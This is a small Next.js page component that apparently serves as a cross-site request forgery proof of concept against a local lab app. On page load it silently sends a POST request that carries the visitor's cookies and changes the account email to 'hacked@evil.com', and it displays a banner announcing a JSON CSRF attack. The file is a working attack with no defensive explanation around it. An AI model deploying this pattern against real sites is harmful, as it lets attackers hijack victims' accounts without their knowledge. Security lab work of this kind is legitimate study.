"use client"
import { useEffect } from "react";

export default function Evilpage() {
    useEffect(() => {
      fetch("http://localhost:3000/api/lab-user/update-email",{
        method : "POST",
        headers : {
            "Content-Type" : "application/json"
        },
        body : JSON.stringify({Email : "hacked@evil.com" , Username : "weiner"}),
        credentials : "include"
      })
    }, []);

    return <h1>😈 Sending JSON CSRF Attack...</h1>;
}
